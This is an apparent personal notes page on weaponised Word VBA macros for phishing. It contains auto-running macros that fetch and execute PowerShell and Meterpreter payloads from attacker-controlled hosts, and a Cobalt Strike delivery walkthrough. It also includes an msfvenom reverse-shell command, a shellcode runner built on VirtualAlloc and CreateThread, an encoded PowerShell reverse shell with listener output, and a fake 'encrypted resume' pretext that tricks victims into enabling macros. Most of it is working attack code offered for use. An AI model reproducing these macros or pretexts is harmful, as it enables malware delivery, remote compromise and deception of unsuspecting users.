---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[VBA Macro]]  
___

## Description:
VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc.

To prepare the document for delivery, go to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.

## CobaltStrike
You can create a macro in a Word document by going to **View > Macros > Create**.  Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macro a name and click **Create**.

``` 

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"

End Sub

```


In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, Type should be powershell. Copy and paste into your VBA (**remember to add double quotes around command**).

Save the document but make sure to change the format from **_.docx_** to **Word 97-2003 (.doc)**. 

host the file on the Team Server so we can simply send a link for them to download and execute. Go to **Attacks > Web drive-by > Host File**. Select **demo.doc** and provide a URI to access it on. 

Run the macro on the victim's machine to get a beacon.

### Powershell staged payload

This macro will pull a Meterpreter executable from our webserver. Make sure to update the download file string.

Wait method is implemented because download times can vary, try increasing the number of seconds if you are having issues.

```
Sub Document_Open()
 MyMacro
End Sub

Sub AutoOpen()
 MyMacro
End Sub

Sub MyMacro()
 Dim str As String
 str = "powershell (New-Object 
System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
 Shell str, vbHide
 Dim exePath As String
 exePath = ActiveDocument.Path + "\msfstaged.exe"
 Wait (5)
 Shell exePath, vbHide
 
End Sub

Sub Wait(n As Long)
 Dim t As Date
 t = Now
 Do
 DoEvents
 Loop Until Now >= DateAdd("s", n, t)
End Sub
```

### Powershell stagedless payload

Use msfvenom to create your reverse shell:
```
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```
Add this VB macro
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes 
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As 
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As 
Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Function MyMacro()
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As Long
 Dim data As Long
 Dim res As Long
 
 buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 
12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 
193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 
227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 
214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 
104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 
114, 111, 106, 0, 83, 255, 213)
 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
 
 For counter = LBound(buf) To UBound(buf)
 data = buf(counter)
 res = RtlMoveMemory(addr + counter, data, 1)
 Next counter
 
 res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 
Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
```

## Powershell one linear

Encoded powershell command can be created with [revshells](https://www.revshells.com/)
```
Sub AutoOpen()
 MyMacro
End Sub
Sub Document_Open()
 MyMacro
End Sub
Sub MyMacro()
 Dim Str As String
 
 Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
 Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
 Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
 Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
 Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
 Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
 ...
 Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
 Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
 Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
 Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
 Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
 Str = Str + "QA="
 CreateObject("Wscript.Shell").Run Str
End Sub
```

```
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 59111
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Offsec>
```

### Phishing PreTexting and The Old Switcheroo

To make the word document more believable and to get the user to Enable Editing and Enable Content, we can add some text to the file that will trick them into enabling these features. First add some text to the file (In this example it is a fake resume):

```
Job Application for Human Resources

This file is encrypted with RSA to protect personal information. To comply with GDPR regulations please Enable Editing and Enable Content shown above.

<!--RSA Encrypted Block --------->
SLDFJSDkljklsdfjklsjfdklLJFGLKDSJFDSSDLFJKLJFsldjflskdajfkdsjflkdasJDSLKFJSLDHFKSHGDkshfdskjhfgdsiaHFDKHSDKJFHSDKHFKLhfdksa;lhfd098732w94rLKHSdLKHDwKLJhfklseahfikalfhhfadlksHHFDKLWSHBKLSBFieiwsrhfse89y982hkBklhfdkijlhlkfehlkhfewliiHE9238UY42398lhklfdehlkjhflekiwhfewlkhEKLWHIEWR89032HklhfdewilhfeihfwheKLJEWHRKLJSAHDSALKFJHokljshdlkjshakhaHSALKJHlkdhlkashDFLIAGHFIW027093240HHklhkljhdflkHWEFHAKS32073hklfhekslHFLKSDHKDSAKFJhkhlfHDSLKLASHHJKDFSALKJSDAHFKLDSJAHFKLDSAHFWOIHEhiuhi8YHklhflkdsDSJFLKDSAJFDLjhkfgbsdlkFJSLDFJ9jfldsLLSD


```

To begin the development of our “decrypted” content, we’ll create a copy of this Word document, 
and delete the existing text content. Next, we’ll insert “decrypted” content, which will display when 
the user enables macros. This content will include the simple fake CV (you could probably find one online)
```
Personal Summary

An effective and confident communicator who is also a self starter with the dedication and motivation required to succeed in a busy HY department.

Career History
...
```
With the text created, we’ll mark it and navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery

In the Create New Building Block dialog box, we’ll enter the name “TheDoc”

With the content stored, we can delete it from the main text area of the document. Next, we’ll copy the fake RSA encrypted text from the original Word document and insert it into the main text area of this document.

Now we’ll need to edit the VBA macro, inserting commands that will delete the fake RSA 
encrypted text and replace it with the fake CV from the AutoText entry.
```
Sub Document_Open()
 SubstitutePage
End Sub
Sub AutoOpen()
 SubstitutePage
End Sub
Sub SubstitutePage()
 ActiveDocument.Content.Select
 Selection.Delete
 ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert 
Where:=Selection.Range, RichText:=True
End Sub
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (03:33 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
